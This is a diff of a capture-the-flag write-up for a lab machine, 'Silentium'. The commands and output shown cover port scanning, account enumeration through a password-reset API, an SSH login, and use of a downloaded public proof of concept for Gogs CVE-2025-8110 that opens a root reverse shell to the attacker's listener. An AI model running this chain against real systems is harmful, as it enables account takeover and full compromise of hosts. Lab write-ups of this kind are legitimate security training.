@@ -35,9 +35,6 @@ tags:
 
 ```bash
 nmap -A -sS -P -T4  --min-rate 5000 10.129.20.232
-```
-
-```text
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-13 14:13 UTC
 Nmap scan report for 10.129.20.232
 Host is up (0.25s latency).
@@ -115,9 +112,6 @@ Finished
 
 ```bash
 curl -s http://staging.silentium.htb/api/v1/version
-```
-
-```text
 {"version":"3.0.5"}
 ```
 
@@ -168,9 +162,7 @@ Dangerous Code Execution: The convertToValidJSONString function executes the inp
 curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
   -H "Content-Type: application/json" \
   -d '{"user":{"email":"marcus@silentium.htb"}}'
-```
 
-```http
 HTTP/1.1 404 Not Found
 Server: nginx/1.24.0 (Ubuntu)
 Date: Thu, 16 Apr 2026 14:53:46 GMT
@@ -182,15 +174,10 @@ Access-Control-Allow-Credentials: true
 ETag: W/"48-gH7pL1CkrO5wpzWe8tiSqCqsAlA"
 
 {"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
-```
 
-```bash
-curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
+ curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
   -H "Content-Type: application/json" \
   -d '{"user":{"email":"elena@silentium.htb"}}'
-```
-
-```http
 HTTP/1.1 404 Not Found
 Server: nginx/1.24.0 (Ubuntu)
 Date: Thu, 16 Apr 2026 14:53:55 GMT
@@ -202,15 +189,10 @@ Access-Control-Allow-Credentials: true
 ETag: W/"48-gH7pL1CkrO5wpzWe8tiSqCqsAlA"
 
 {"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
-```
 
-```bash
 curl -i -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
   -H "Content-Type: application/json" \
   -d '{"user":{"email":"ben@silentium.htb"}}'
-```
-
-```http
 HTTP/1.1 201 Created
 Server: nginx/1.24.0 (Ubuntu)
 Date: Thu, 16 Apr 2026 14:54:02 GMT
@@ -227,6 +209,10 @@ ETag: W/"243-yhsRpTf1RS5s1OovC3d2KP9AkCY"
 - 🔍 *Got token for ben 10 :)*
 
 - 🔍 *Go to the reset-password endpoint, paste this token, and then change the password, and then just log in!*
+
+```text
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+```
 
 ## Step 2 - Initial Foothold
 
@@ -299,9 +285,6 @@ SMTP_USER=test
 
 ```bash
 ssh ben@silentium.htb
-```
-
-```text
 ben@silentium.htb's password: 
 Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
 
@@ -335,21 +318,17 @@ Learn more about enabling ESM Apps service at https://ubuntu.com/esm
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
-```
+ben@silentium:~$ 
 
-```bash
-ben@silentium:~$
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ```
 
 ## Step 3 - Post Exploitation
 
 - 🔍 *Lets look for sudo permissions*
 
-```bash
-ben@silentium:/opt/gogs/gogs$ sudo -l
-```
-
 ```text
+ben@silentium:/opt/gogs/gogs$ sudo -l
 [sudo] password for ben: 
 Sorry, user ben may not run sudo on silentium.
 ```
@@ -358,13 +337,10 @@ Sorry, user ben may not run sudo on silentium.
 
 - 🔍 *While enumerating i found a gogs executable!*
 
-```bash
+```text
 ben@silentium:~$ cd /
 
 ben@silentium:/$ ls
-```
-
-```text
 bin    lib.usr-is-merged  sbin
 boot   lost+found         sbin.usr-is-merged
 cdrom  media              snap
@@ -373,28 +349,15 @@ etc    opt                sys
 home   proc               tmp
 lib    root               usr
 lib64  run                var
-```
 
-```bash
 ben@silentium:/$ cd opt
 
 ben@silentium:/opt$ ls
-```
-
-```text
 containerd  gogs
-```
-
-```bash
 ben@silentium:/opt$ cd gogs
 ben@silentium:/opt/gogs$ ls
-```
-
-```text
 custom  data  gogs  log
-```
 
-```bash
 ben@silentium:/opt/gogs$ cd custom
 -bash: cd: custom: Permission denied
 
@@ -404,18 +367,10 @@ ben@silentium:/opt/gogs$ cd data
 ben@silentium:/opt/gogs$ cd gogs
 
 ben@silentium:/opt/gogs/gogs$ ls
-```
-
-```text
 custom  gogs     log        README_ZH.md
 data    LICENSE  README.md  scripts
-```
 
-```bash
 ben@silentium:/opt/gogs/gogs$ ls -la
-```
-
-```text
 total 79368
 drwxr-xr-x 6 root root     4096 Apr  8 09:41 .
 drwxr-xr-x 6 root root     4096 Apr  8 09:41 ..
@@ -431,11 +386,8 @@ drwxr-xr-x 7 root root     4096 Apr  8 09:41 scripts
 
 - 🔍 *We can execute it. lets execute then*
 
-```bash
-ben@silentium:/$ /opt/gogs/gogs/gogs --help
-```
-
 ```text
+ben@silentium:/$ /opt/gogs/gogs/gogs --help
 NAME:
    Gogs - A painless self-hosted Git service
 
@@ -467,11 +419,9 @@ GLOBAL OPTIONS:
 
 - 🔍 *Lets look at netstats*
 
-```bash
-ben@silentium:~$ netstat -lantp
-```
-
 ```text
+ben@silentium:~$ netstat -lantp
+
 (Not all processes could be identified, non-owned process info
  will not be shown, you would have to be root to see it all.)
 Active Internet connections (servers and established)
@@ -495,12 +445,9 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 
 - 🔍 *While digging more, i knew that, the 3000 is running flowise instance and the 3001 is running gogs service*
 
-```bash
-ben@silentium:~$ curl http://127.0.0.1:3001 | head
-```
-
 ```text
-% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+ben@silentium:~$ curl http://127.0.0.1:3001 | head
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100  80<!DOCTYPE html>  0     0      0      0 --:--:-- --:--:-- --:--:--     0
 49<html>
@@ -535,7 +482,7 @@ This triggers RCE on Git operations Cyber Press
 
 - 🔍 *There is a public POC for this exploitation*
 
-```bash
+```text
 wget https://raw.githubusercontent.com/zAbuQasem/gogs-CVE-2025-8110/main/CVE-2025-8110.py
 ```
 
@@ -566,9 +513,6 @@ wget https://raw.githubusercontent.com/zAbuQasem/gogs-CVE-2025-8110/main/CVE-202
 
 ```bash
 python3 CVE-2025-8110.py -u http://127.0.0.1:9000 -lh "10.10.14.****" -lp 6000
-```
-
-```text
 [+] Authenticated successfully
 Token generation status: 200
 [+] Application token: 
@@ -603,22 +547,15 @@ listening on [any] 6000 ...
 connect to [10.10.14.253] from (UNKNOWN) [10.129.38.127] 58482
 bash: cannot set terminal process group (1485): Inappropriate ioctl for device
 bash: no job control in this shell
-```
-
-```bash
 root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# cd /
 cd /
 root@silentium:/# cd root
 cd root
 root@silentium:~# ls
 ls
-```
-
-```text
 gogs-repositories
 root.txt
 ```
-
 
 ## Mitigations & Security Perspective
 
